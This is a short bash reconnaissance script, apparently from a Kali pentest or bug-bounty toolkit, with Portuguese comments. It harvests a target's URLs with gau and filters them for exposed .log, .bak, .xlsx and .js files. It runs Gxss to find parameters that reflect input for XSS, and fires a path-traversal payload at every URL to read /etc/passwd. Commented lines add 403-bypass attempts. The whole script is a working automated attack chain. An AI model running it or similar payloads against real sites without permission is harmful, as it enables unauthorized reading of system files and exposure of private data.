#!/bin/bash

/home/kali/tools/brutefinder.sh $1

cat domains_$1 | gau --subs --threads 5 | tee allUrls.txt; 

cat allUrls.txt | grep -i "\.log$" | tee log.txt;
cat allUrls.txt | grep -i "\.bak$" | tee bak.txt;
cat allUrls.txt | grep -i "\.xlsx$" | tee xlsx.txt;
cat allUrls.txt | grep -i "\.js$" | tee jsfiles.txt;

#cat domains_$1 | grep -i "\.<extensao>$" allUrls.txt | tee log.txt;

grep "=" allUrls.txt | tee allParams.txt; # Encontrar parametros que recebem algo
cat allParams.txt | Gxss -c 100 -o reflected.txt; # Encontrar parametros que refletem caracteres para xss
httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar LFI


#httpx -l allUrls.txt -mc 403 | tee 403s.txt; # Encontrar arquivos/direorios que nao temos acesso para tentar bypass
#/home/kali/tools/403-bypass/403-bypass.py -U 403s.txt; # tentativa de bypass com outro script
